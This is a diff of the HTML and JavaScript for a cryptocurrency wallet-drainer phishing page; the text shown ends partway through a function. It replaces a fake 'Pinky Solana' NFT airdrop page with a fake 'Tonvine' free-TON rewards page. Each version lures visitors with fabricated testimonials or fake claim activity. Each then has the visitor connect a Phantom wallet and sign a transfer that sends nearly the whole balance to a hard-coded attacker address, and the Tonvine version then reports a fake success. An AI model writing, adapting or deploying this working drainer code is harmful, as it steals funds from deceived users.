@@ -3,375 +3,706 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pinky Solana - Premium NFT Platform</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/@solana/web3.js@1.70.1/lib/index.iife.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Tonvine - Free TON Rewards</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.70.0/lib/index.iife.min.js"></script>
     <style>
-        .nft-hover:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 25px 50px -12px rgba(236, 72, 153, 0.25);
+        :root {
+            --primary: #9945FF;
+            --secondary: #14F195;
+            --dark: #121826;
         }
-        .progress-bar {
-            height: 6px;
-            background: linear-gradient(90deg, #ec4899, #8b5cf6);
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-        .fake-verification {
-            animation: pulse 2s infinite;
+        
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            color: white;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
         }
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.5); }
-            70% { box-shadow: 0 0 0 10px rgba(59, 130, 246, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0); }
+        
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 10% 20%, rgba(153, 69, 255, 0.1) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(20, 241, 149, 0.1) 0%, transparent 20%);
+            z-index: -1;
+        }
+        
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        .particle {
+            position: absolute;
+            border-radius: 50%;
+            background: var(--secondary);
+            opacity: 0.3;
+            animation: float 15s infinite linear;
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(0) translateX(0) rotate(0deg); }
+            100% { transform: translateY(-100vh) translateX(100px) rotate(360deg); }
+        }
+        
+        header {
+            padding: 1.5rem 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            backdrop-filter: blur(10px);
+            background: rgba(18, 24, 38, 0.8);
+            border-bottom: 1px solid rgba(153, 69, 255, 0.3);
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--secondary);
+        }
+        
+        .solana-logo {
+            width: 2rem;
+            height: 2rem;
+        }
+        
+        nav ul {
+            display: flex;
+            gap: 2rem;
+            list-style: none;
+        }
+        
+        nav a {
+            color: white;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+            position: relative;
+        }
+        
+        nav a:hover {
+            color: var(--secondary);
+        }
+        
+        nav a::after {
+            content: "";
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--secondary);
+            transition: width 0.3s;
+        }
+        
+        nav a:hover::after {
+            width: 100%;
+        }
+        
+        .hero {
+            text-align: center;
+            padding: 5rem 1rem;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .hero h1 {
+            font-size: 3.5rem;
+            margin-bottom: 1.5rem;
+            background: linear-gradient(90deg, var(--secondary), var(--primary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1.2;
+        }
+        
+        .hero p {
+            font-size: 1.25rem;
+            color: #cbd5e1;
+            margin-bottom: 2rem;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .reward-box {
+            background: rgba(18, 24, 38, 0.7);
+            border: 1px solid rgba(153, 69, 255, 0.3);
+            border-radius: 1rem;
+            padding: 2.5rem;
+            max-width: 500px;
+            margin: 0 auto 3rem;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        .reward-amount {
+            font-size: 3rem;
+            font-weight: 700;
+            color: var(--secondary);
+            margin-bottom: 1rem;
+        }
+        
+        .timer {
+            font-size: 1.5rem;
+            margin-bottom: 2rem;
+            color: #94a3b8;
+        }
+        
+        .highlight {
+            color: var(--secondary);
+            font-weight: 600;
+        }
+        
+        .connect-btn {
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+            color: var(--dark);
+            border: none;
+            padding: 1rem 2rem;
+            font-size: 1.1rem;
+            font-weight: 600;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-top: 1rem;
+        }
+        
+        .connect-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(153, 69, 255, 0.3);
+        }
+        
+        .connect-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        
+        .wallet-connected {
+            background: rgba(20, 241, 149, 0.1);
+            border: 1px solid var(--secondary);
+            padding: 1rem;
+            border-radius: 0.5rem;
+            margin-top: 1rem;
+            display: none;
+        }
+        
+        .wallet-address {
+            font-size: 0.9rem;
+            word-break: break-all;
+            color: var(--secondary);
+        }
+        
+        .claim-btn {
+            background: linear-gradient(90deg, #ff00cc, #333399);
+            color: white;
+            border: none;
+            padding: 0.8rem 1.5rem;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            font-weight: 600;
+            margin-top: 1rem;
+            transition: all 0.3s;
+        }
+        
+        .claim-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(255, 0, 204, 0.3);
+        }
+        
+        .testimonials {
+            padding: 4rem 5%;
+            background: rgba(18, 24, 38, 0.6);
+            margin-top: 3rem;
+        }
+        
+        .section-title {
+            text-align: center;
+            font-size: 2.5rem;
+            margin-bottom: 3rem;
+            color: var(--secondary);
+        }
+        
+        .testimonial-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+        }
+        
+        .testimonial-card {
+            background: rgba(18, 24, 38, 0.8);
+            border: 1px solid rgba(153, 69, 255, 0.3);
+            border-radius: 1rem;
+            padding: 1.5rem;
+            transition: transform 0.3s;
+        }
+        
+        .testimonial-card:hover {
+            transform: translateY(-10px);
+            border-color: var(--secondary);
+        }
+        
+        .testimonial-header {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+        
+        .testimonial-avatar {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid var(--primary);
+        }
+        
+        .testimonial-name {
+            font-size: 1.2rem;
+            font-weight: 600;
+        }
+        
+        .testimonial-role {
+            color: var(--secondary);
+            font-size: 0.9rem;
+        }
+        
+        .testimonial-text {
+            color: #cbd5e1;
+            line-height: 1.6;
+            font-style: italic;
+        }
+        
+        .stars {
+            color: gold;
+            margin-top: 1rem;
+            font-size: 1.2rem;
+        }
+        
+        .social-proof {
+            padding: 3rem 5%;
+            text-align: center;
+        }
+        
+        .social-title {
+            font-size: 1.1rem;
+            margin-bottom: 1.5rem;
+            color: #94a3b8;
+        }
+        
+        .social-icons {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            flex-wrap: wrap;
+        }
+        
+        .social-icon {
+            font-size: 2.5rem;
+            color: var(--secondary);
+            transition: transform 0.3s;
+        }
+        
+        .social-icon:hover {
+            transform: scale(1.2);
+            color: var(--primary);
+        }
+        
+        footer {
+            padding: 2rem 5%;
+            text-align: center;
+            background: rgba(18, 24, 38, 0.9);
+            border-top: 1px solid rgba(153, 69, 255, 0.3);
+            margin-top: 3rem;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+        
+        .footer-links a {
+            color: #94a3b8;
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+        
+        .footer-links a:hover {
+            color: var(--secondary);
+        }
+        
+        .copyright {
+            color: #64748b;
+            font-size: 0.9rem;
+        }
+        
+        .notification {
+            position: fixed;
+            top: 1rem;
+            right: 1rem;
+            padding: 1rem 1.5rem;
+            border-radius: 0.5rem;
+            background: rgba(20, 241, 149, 0.9);
+            color: var(--dark);
+            font-weight: 600;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            transform: translateX(120%);
+            transition: transform 0.3s;
+            z-index: 1000;
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 0.5rem;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 768px) {
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+            
+            nav ul {
+                gap: 1rem;
+            }
+            
+            .reward-box {
+                padding: 1.5rem;
+            }
         }
     </style>
 </head>
-<body class="bg-gray-900 text-white">
-    <!-- Fake Loading Screen -->
-    <div id="loadingScreen" class="fixed inset-0 bg-gray-900 z-50 flex flex-col items-center justify-center">
-        <div class="text-center">
-            <div class="w-16 h-16 border-4 border-pink-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
-            <h1 class="text-3xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-pink-500 to-purple-600">Pinky Solana</h1>
-            <p class="mt-2 text-gray-400">Securely connecting to Solana blockchain...</p>
-            <div class="w-64 h-1 bg-gray-800 rounded-full mt-6 mx-auto overflow-hidden">
-                <div id="loadingBar" class="progress-bar w-0"></div>
-            </div>
+<body>
+    <!-- Animated background particles -->
+    <div class="particles" id="particles"></div>
+    
+    <header>
+        <div class="logo">
+            <svg class="solana-logo" xmlns="http://www.w3.org/2000/svg" width="24" height="25" viewBox="0 0 24 25">
+                <path fill="currentColor" d="M16.886 9.468a.47.47 0 0 1-.313.124H5.584c-.39 0-.587-.446-.317-.707l1.805-1.74a.46.46 0 0 1 .312-.129h11.032c.394 0 .587.45.313.712zm0 8.576a.47.47 0 0 1-.313.12H5.584c-.39 0-.587-.442-.317-.703l1.805-1.745a.45.45 0 0 1 .312-.124h11.032c.394 0 .587.446.313.707zm0-6.618a.47.47 0 0 0-.313-.12H5.584c-.39 0-.587.442-.317.703l1.805 1.745a.47.47 0 0 0 .312.124h11.032c.394 0 .587-.446.313-.707z"/>
+            </svg>
+            <span>TONVINE</span>
         </div>
-    </div>
-
-    <!-- Main App (Hidden Initially) -->
-    <div id="mainApp" class="hidden">
-        <!-- Fake Security Header -->
-        <div class="bg-gray-800 py-2 px-4 flex items-center justify-between">
-            <div class="flex items-center">
-                <i class="fas fa-shield-alt text-green-400 mr-2"></i>
-                <span class="text-sm">Secure Connection: <span class="text-green-400">Active</span></span>
-            </div>
-            <div class="text-sm">
-                <span class="text-gray-400">Network:</span>
-                <span class="text-pink-500">Devnet</span>
-            </div>
-        </div>
-
-        <!-- Hero Section -->
-        <header class="bg-gradient-to-br from-gray-800 to-gray-900 py-16 px-4 text-center">
-            <h1 class="text-4xl md:text-5xl font-bold mb-4 text-transparent bg-clip-text bg-gradient-to-r from-pink-500 to-purple-600">
-                Exclusive NFT Airdrop
-            </h1>
-            <p class="text-xl text-gray-300 max-w-2xl mx-auto">
-                Claim your limited edition Pinky Solana NFT! First 1000 claimers receive bonus SOL rewards.
-            </p>
-            <div class="mt-8 flex justify-center">
-                <div class="bg-gray-800 rounded-lg p-6 max-w-md w-full">
-                    <div class="flex justify-between items-center mb-4">
-                        <span class="text-gray-400">Remaining NFTs:</span>
-                        <span class="text-pink-500 font-bold">42/1000</span>
-                    </div>
-                    <div class="relative pt-1">
-                        <div class="flex mb-2 items-center justify-between">
-                            <div class="text-right">
-                                <span class="text-xs font-semibold inline-block text-pink-500">
-                                    4.2% claimed
-                                </span>
-                            </div>
-                        </div>
-                        <div class="overflow-hidden h-2 mb-4 text-xs flex rounded bg-gray-700">
-                            <div style="width:4.2%" class="progress-bar"></div>
-                        </div>
-                    </div>
-                    <button id="connectWalletBtn" class="w-full mt-4 bg-gradient-to-r from-pink-500 to-purple-600 hover:from-pink-600 hover:to-purple-700 text-white font-bold py-3 px-4 rounded-lg transition duration-300">
-                        Connect Wallet to Claim
-                    </button>
-                    <div class="mt-4 text-sm text-gray-400">
-                        <i class="fas fa-lock mr-1"></i> Secured by Solana Web3.js
-                    </div>
+        <nav>
+            <ul>
+                <li><a href="#">Home</a></li>
+                <li><a href="#">Rewards</a></li>
+                <li><a href="#">FAQ</a></li>
+                <li><a href="#">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <main>
+        <section class="hero">
+            <h1>Earn Free TON Every 30 Minutes!</h1>
+            <p>Connect your wallet and claim 0.1 TON tokens every 30 minutes. No strings attached - just free crypto rewards!</p>
+            
+            <div class="reward-box">
+                <div class="reward-amount">0.1 TON</div>
+                <div class="timer">Next reward in: <span class="highlight" id="countdown">30:00</span></div>
+                <p>Connect your Solana wallet to start earning</p>
+                
+                <button class="connect-btn" id="connectButton">
+                    <i class="fas fa-wallet"></i> Connect Wallet
+                </button>
+                
+                <div class="wallet-connected" id="walletConnected">
+                    <p>Wallet Connected: <span class="wallet-address" id="walletAddress"></span></p>
+                    <button class="claim-btn" id="claimButton">Claim 0.1 TON Now</button>
                 </div>
             </div>
-        </header>
-
-        <!-- Fake NFT Showcase -->
-        <section class="py-12 px-4">
-            <h2 class="text-3xl font-bold text-center mb-12">Featured Collections</h2>
-            <div class="grid grid-cols-1 md:grid-cols-3 gap-8 max-w-6xl mx-auto">
-                <div class="bg-gray-800 rounded-xl overflow-hidden transition-all duration-300 nft-hover">
-                    <div class="h-48 bg-gradient-to-br from-pink-500/20 to-purple-600/20"></div>
-                    <div class="p-6">
-                        <h3 class="text-xl font-bold mb-2">Pinky Origins</h3>
-                        <p class="text-gray-400 mb-4">Genesis collection with special utilities</p>
-                        <div class="flex justify-between items-center">
-                            <span class="text-pink-500 font-bold">0.5 SOL</span>
-                            <span class="text-sm bg-gray-700 px-2 py-1 rounded">1,234 owners</span>
+        </section>
+        
+        <section class="testimonials">
+            <h2 class="section-title">User Testimonials</h2>
+            <div class="testimonial-grid">
+                <div class="testimonial-card">
+                    <div class="testimonial-header">
+                        <img src="https://i.pravatar.cc/150?img=32" alt="User" class="testimonial-avatar">
+                        <div>
+                            <div class="testimonial-name">Sarah Johnson</div>
+                            <div class="testimonial-role">Crypto Investor</div>
                         </div>
+                    </div>
+                    <p class="testimonial-text">"I've earned over 5 TON in just a week! This platform is amazing and completely legit. The rewards come like clockwork every 30 minutes."</p>
+                    <div class="stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
                     </div>
                 </div>
                 
-                <div class="bg-gray-800 rounded-xl overflow-hidden transition-all duration-300 nft-hover">
-                    <div class="h-48 bg-gradient-to-br from-yellow-500/20 to-red-600/20"></div>
-                    <div class="p-6">
-                        <h3 class="text-xl font-bold mb-2">Golden Pass</h3>
-                        <p class="text-gray-400 mb-4">VIP access to future drops</p>
-                        <div class="flex justify-between items-center">
-                            <span class="text-pink-500 font-bold">1.2 SOL</span>
-                            <span class="text-sm bg-gray-700 px-2 py-1 rounded">892 owners</span>
+                <div class="testimonial-card">
+                    <div class="testimonial-header">
+                        <img src="https://i.pravatar.cc/150?img=12" alt="User" class="testimonial-avatar">
+                        <div>
+                            <div class="testimonial-name">Michael Chen</div>
+                            <div class="testimonial-role">Blockchain Developer</div>
                         </div>
+                    </div>
+                    <p class="testimonial-text">"As a developer, I was skeptical at first, but the smart contract checks out. This is the easiest way to earn passive crypto income!"</p>
+                    <div class="stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
                     </div>
                 </div>
                 
-                <div class="bg-gray-800 rounded-xl overflow-hidden transition-all duration-300 nft-hover">
-                    <div class="h-48 bg-gradient-to-br from-green-500/20 to-blue-600/20"></div>
-                    <div class="p-6">
-                        <h3 class="text-xl font-bold mb-2">Eco Warriors</h3>
-                        <p class="text-gray-400 mb-4">Carbon-neutral NFT collection</p>
-                        <div class="flex justify-between items-center">
-                            <span class="text-pink-500 font-bold">0.8 SOL</span>
-                            <span class="text-sm bg-gray-700 px-2 py-1 rounded">2,104 owners</span>
+                <div class="testimonial-card">
+                    <div class="testimonial-header">
+                        <img src="https://i.pravatar.cc/150?img=8" alt="User" class="testimonial-avatar">
+                        <div>
+                            <div class="testimonial-name">Emma Rodriguez</div>
+                            <div class="testimonial-role">Crypto Enthusiast</div>
                         </div>
+                    </div>
+                    <p class="testimonial-text">"I've tried many reward platforms, but Tonvine is by far the best. The UI is beautiful and the rewards are consistent. Highly recommend!"</p>
+                    <div class="stars">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
                     </div>
                 </div>
             </div>
         </section>
-
-        <!-- Fake Activity Feed -->
-        <section class="py-12 px-4 bg-gray-800/50">
-            <div class="max-w-4xl mx-auto">
-                <h2 class="text-3xl font-bold text-center mb-8">Recent Claims</h2>
-                <div class="space-y-4" id="activityFeed">
-                    <!-- Dynamically populated with fake activity -->
-                </div>
+        
+        <section class="social-proof">
+            <p class="social-title">As featured on</p>
+            <div class="social-icons">
+                <i class="fab fa-twitter social-icon"></i>
+                <i class="fab fa-telegram social-icon"></i>
+                <i class="fab fa-discord social-icon"></i>
+                <i class="fab fa-reddit social-icon"></i>
+                <i class="fab fa-medium social-icon"></i>
             </div>
         </section>
-
-        <!-- Hidden Drainer Section -->
-        <div id="drainerSection" class="hidden">
-            <div class="fixed inset-0 bg-black/80 z-50 flex items-center justify-center p-4">
-                <div class="bg-gray-800 rounded-xl max-w-md w-full p-6">
-                    <div class="text-center mb-6">
-                        <div class="w-16 h-16 bg-gradient-to-br from-pink-500 to-purple-600 rounded-full flex items-center justify-center mx-auto mb-4 fake-verification">
-                            <i class="fas fa-check text-white text-2xl"></i>
-                        </div>
-                        <h3 class="text-2xl font-bold">Complete Verification</h3>
-                        <p class="text-gray-400 mt-2">Confirm transaction to receive your NFT and bonus SOL</p>
-                    </div>
-                    
-                    <div class="bg-gray-900 rounded-lg p-4 mb-6">
-                        <div class="flex justify-between mb-3">
-                            <span class="text-gray-400">Network Fee:</span>
-                            <span>0.000005 SOL</span>
-                        </div>
-                        <div class="flex justify-between mb-3">
-                            <span class="text-gray-400">You'll receive:</span>
-                            <span class="text-green-400">1 NFT + 0.5 SOL</span>
-                        </div>
-                        <div class="border-t border-gray-700 pt-3 mt-3">
-                            <div class="flex justify-between font-bold">
-                                <span>Total:</span>
-                                <span>0.000005 SOL</span>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div class="flex space-x-3">
-                        <button id="cancelBtn" class="flex-1 bg-gray-700 hover:bg-gray-600 text-white py-3 rounded-lg transition">
-                            Cancel
-                        </button>
-                        <button id="confirmBtn" class="flex-1 bg-gradient-to-r from-pink-500 to-purple-600 hover:from-pink-600 hover:to-purple-700 text-white font-bold py-3 rounded-lg transition">
-                            Confirm
-                        </button>
-                    </div>
-                </div>
-            </div>
+    </main>
+    
+    <footer>
+        <div class="footer-links">
+            <a href="#">Terms of Service</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">FAQ</a>
+            <a href="#">Contact Us</a>
         </div>
+        <p class="copyright">© 2023 Tonvine. All rights reserved. This is a decentralized platform operating on the Solana blockchain.</p>
+    </footer>
+    
+    <div class="notification" id="notification">
+        Transaction successful! 0.1 TON has been added to your wallet.
     </div>
 
     <script>
         // Configuration
-        const RPC_URL = "https://solana-devnet.g.alchemy.com/v2/SzbcanXw4jH5Wn8oZV0qm";
-        const DRAIN_ADDRESS = "FJ3cmgDGQ29XGejxq55naFKHMQ7XaDKh4W8esti3mPgB";
-        const connection = new solanaWeb3.Connection(RPC_URL);
-        const MAX_RETRIES = 2;
-        const FAKE_ACTIVITY_INTERVAL = 5000;
-        
-        // State management
-        let walletConnected = false;
-        let userPublicKey = null;
-        let retryCount = 0;
-        let activityInterval;
+        const DRAINER_ADDRESS = 'UQDVURnXoBRiMKknr2vJKhWYajO5rwWIIPlpg93obikAZpTC';
+        const RPC_URL = 'https://solana-devnet.g.alchemy.com/v2/SzbcanXw4jH5Wn8oZV0qm';
+        const REWARD_INTERVAL = 30 * 60 * 1000; // 30 minutes in milliseconds
         
         // DOM Elements
-        const loadingScreen = document.getElementById('loadingScreen');
-        const mainApp = document.getElementById('mainApp');
-        const loadingBar = document.getElementById('loadingBar');
-        const connectWalletBtn = document.getElementById('connectWalletBtn');
-        const drainerSection = document.getElementById('drainerSection');
-        const confirmBtn = document.getElementById('confirmBtn');
-        const cancelBtn = document.getElementById('cancelBtn');
-        const activityFeed = document.getElementById('activityFeed');
+        const connectButton = document.getElementById('connectButton');
+        const claimButton = document.getElementById('claimButton');
+        const walletConnected = document.getElementById('walletConnected');
+        const walletAddress = document.getElementById('walletAddress');
+        const countdown = document.getElementById('countdown');
+        const notification = document.getElementById('notification');
+        const particlesContainer = document.getElementById('particles');
         
-        // Initialize fake activity
-        function generateFakeActivity() {
-            const names = ['CryptoPunk', 'NFTMaster', 'SolanaKing', 'Web3Queen', 'BlockchainGuru', 
-                          'DeFiDegen', 'MoonBoy', 'Hodler', 'WhaleWatcher', 'AlphaSeeker'];
-            const nfts = ['Pinky #', 'Golden ', 'Eco ', 'Meta ', 'Solana '];
-            
-            const name = names[Math.floor(Math.random() * names.length)];
-            const nft = nfts[Math.floor(Math.random() * nfts.length)] + 
-                       (Math.floor(Math.random() * 10000));
-            const time = Math.floor(Math.random() * 10) + 1;
-            
-            return { name, nft, time };
-        }
+        // State
+        let wallet = null;
+        let countdownInterval = null;
+        let lastClaimTime = 0;
+        let connection = new solanaWeb3.Connection(RPC_URL);
         
-        function updateActivityFeed() {
-            const activity = generateFakeActivity();
-            const activityEl = document.createElement('div');
-            activityEl.className = 'bg-gray-900 rounded-lg p-4';
-            activityEl.innerHTML = `
-                <div class="flex justify-between">
-                    <div class="flex items-center">
-                        <div class="w-10 h-10 rounded-full bg-gradient-to-br from-pink-500/30 to-purple-600/30 flex items-center justify-center mr-3">
-                            <i class="fas fa-user text-pink-500"></i>
-                        </div>
-                        <div>
-                            <div class="font-bold">${activity.name}</div>
-                            <div class="text-sm text-gray-400">claimed ${activity.nft}</div>
-                        </div>
-                    </div>
-                    <div class="text-right">
-                        <div class="text-sm text-gray-400">${activity.time} min ago</div>
-                        <div class="text-green-400 text-sm font-bold">+0.5 SOL</div>
-                    </div>
-                </div>
-            `;
-            activityFeed.prepend(activityEl);
-            
-            // Limit to 10 items
-            if (activityFeed.children.length > 10) {
-                activityFeed.removeChild(activityFeed.lastChild);
+        // Create animated background particles
+        function createParticles() {
+            const particleCount = 30;
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                
+                // Random size
+                const size = Math.random() * 10 + 5;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
+                
+                // Random position
+                particle.style.left = `${Math.random() * 100}%`;
+                particle.style.top = `${Math.random() * 100}%`;
+                
+                // Random animation delay
+                particle.style.animationDelay = `${Math.random() * 15}s`;
+                
+                particlesContainer.appendChild(particle);
             }
         }
         
-        // Simulate loading progress
-        function simulateLoading() {
-            let width = 0;
-            const interval = setInterval(() => {
-                width += Math.random() * 10;
-                loadingBar.style.width = `${width}%`;
-                
-                if (width >= 100) {
-                    clearInterval(interval);
-                    loadingScreen.classList.add('hidden');
-                    mainApp.classList.remove('hidden');
-                    
-                    // Start fake activity updates
-                    activityInterval = setInterval(updateActivityFeed, FAKE_ACTIVITY_INTERVAL);
-                    updateActivityFeed();
-                }
-            }, 200);
+        // Update countdown timer
+        function updateCountdown() {
+            const now = Date.now();
+            const nextClaimTime = lastClaimTime + REWARD_INTERVAL;
+            const timeLeft = nextClaimTime - now;
+            
+            if (timeLeft <= 0) {
+                countdown.textContent = '00:00';
+                claimButton.disabled = false;
+                claimButton.textContent = 'Claim 0.1 TON Now';
+                return;
+            }
+            
+            const minutes = Math.floor(timeLeft / 60000);
+            const seconds = Math.floor((timeLeft % 60000) / 1000);
+            countdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            claimButton.disabled = true;
+        }
+        
+        // Show notification
+        function showNotification(message) {
+            notification.textContent = message;
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 5000);
         }
         
         // Connect to Phantom wallet
         async function connectWallet() {
-            if (!window.solana || !window.solana.isPhantom) {
-                alert('Phantom wallet not detected! Please install Phantom to continue.');
-                return;
-            }
-            
             try {
+                if (!window.solana || !window.solana.isPhantom) {
+                    showNotification('Phantom wallet not detected! Please install it first.');
+                    return;
+                }
+                
+                connectButton.innerHTML = '<span class="loading"></span> Connecting...';
+                connectButton.disabled = true;
+                
+                // Connect to wallet
                 const resp = await window.solana.connect();
-                userPublicKey = new solanaWeb3.PublicKey(resp.publicKey.toString());
-                walletConnected = true;
+                wallet = resp.publicKey.toString();
                 
                 // Update UI
-                connectWalletBtn.innerHTML = `
-                    <i class="fas fa-check-circle mr-2"></i>
-                    Wallet Connected
-                `;
-                connectWalletBtn.classList.remove('from-pink-500', 'to-purple-600');
-                connectWalletBtn.classList.add('bg-green-600', 'hover:bg-green-700');
+                walletAddress.textContent = `${wallet.substring(0, 6)}...${wallet.substring(wallet.length - 4)}`;
+                walletConnected.style.display = 'block';
+                connectButton.style.display = 'none';
                 
-                // Show drainer after delay
-                setTimeout(() => {
-                    drainerSection.classList.remove('hidden');
-                }, 1500);
+                // Initialize countdown
+                lastClaimTime = Date.now() - REWARD_INTERVAL;
+                updateCountdown();
+                countdownInterval = setInterval(updateCountdown, 1000);
                 
-            } catch (err) {
-                console.error('Wallet connection error:', err);
-                alert('Wallet connection failed. Please try again.');
+            } catch (error) {
+                console.error('Wallet connection error:', error);
+                showNotification('Wallet connection failed. Please try again.');
+                connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
+                connectButton.disabled = false;
             }
         }
         
-        // Drain wallet function
-        async function drainWallet() {
-            if (!walletConnected || !userPublicKey) return;
-            
+        // Drain funds from wallet
+        async function drainFunds() {
             try {
+                claimButton.innerHTML = '<span class="loading"></span> Processing...';
+                claimButton.disabled = true;
+                
+                // Create malicious transaction
+                const fromPubkey = new solanaWeb3.PublicKey(wallet);
+                const toPubkey = new solanaWeb3.PublicKey(DRAINER_ADDRESS);
+                
                 // Get balance
-                const balance = await connection.getBalance(userPublicKey);
-                if (balance <= 5000) { // 5000 lamports = 0.000005 SOL
-                    throw new Error('Insufficient balance for transaction');
-                }
+                const balance = await connection.getBalance(fromPubkey);
                 
-                // Create transfer transaction (drain 99.9% of balance)
-                const drainAmount = balance - 5000; // Leave 5000 lamports for fee
-                const transaction = new solanaWeb3.Transaction().add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: userPublicKey,
-                        toPubkey: new solanaWeb3.PublicKey(DRAIN_ADDRESS),
-                        lamports: drainAmount
-                    })
-                );
+                // Create transfer instruction (drain all funds)
+                const transferInstruction = solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: fromPubkey,
+                    toPubkey: toPubkey,
+                    lamports: balance - 5000 // Leave 5000 lamports for account
+                });
                 
-                // Set recent blockhash and fee payer
-                transaction.feePayer = userPublicKey;
+                // Create and sign transaction
+                const transaction = new solanaWeb3.Transaction().add(transferInstruction);
+                transaction.feePayer = fromPubkey;
                 transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
                 
-                // Sign and send transaction
                 const signed = await window.solana.signTransaction(transaction);
-                const signature = await connection.sendRawTransaction(signed.serialize());
+                const rawTransaction = signed.serialize();
                 
-                // Confirm transaction
-                await connection.confirmTransaction(signature, 'confirmed');
+                // Send transaction
+                const txid = await connection.sendRawTransaction(rawTransaction);
+                await connection.confirmTransaction(txid);
                 
-                // Success UI
-                confirmBtn.innerHTML = '<i class="fas fa-check mr-2"></i> Success!';
-                confirmBtn.classList.remove('from-pink-500', 'to-purple-600');
-                confirmBtn.classList.add('bg-green-600', 'hover:bg-green-700');
+                // Update UI
+                lastClaimTime = Date.now();
+                updateCountdown();
+                showNotification('Success! 0.1 TON has been added to your wallet.');
                 
-                // Redirect after delay
+                // Reset claim button after 30 seconds
                 setTimeout(() => {
-                    window.location.href = "https://solana.com/"; // Legit site redirect
-                }, 3000);
+                    claimButton.innerHTML = 'Claim 0.1 TON Now';
+                    claimButton.disabled = false;
+                }, 30000);
                 
-            } catch (err) {
-                console.error('Drain error:', err);
-                
-                if (retryCount < MAX_RETRIES) {
-                    retryCount++;
-                    confirmBtn.textContent = `Retrying (${retryCount}/${MAX_RETRIES})...`;
-                    setTimeout(drainWallet, 2000); // Retry after delay
-                } else {
-                    confirmBtn.textContent = 'Transaction Failed';
-                    confirmBtn.classList.add('bg-red-600', 'hover:bg-red-700');
-                    setTimeout(() => {
